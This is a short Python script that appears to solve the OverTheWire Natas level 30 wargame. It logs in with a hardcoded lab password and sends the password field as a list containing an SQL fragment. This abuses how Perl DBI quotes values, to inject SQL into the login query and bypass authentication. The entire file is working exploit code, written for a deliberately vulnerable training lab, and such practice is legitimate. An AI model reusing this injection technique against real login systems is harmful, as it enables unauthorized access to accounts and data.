import requests

url = "http://natas30.natas.labs.overthewire.org/index.pl"

s = requests.Session()
s.auth = ('natas30', 'Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X')

args = { "username": "natas31", "password": ["'' or 1", 2] }
r = s.post(url,  data=args)
print (r.text)

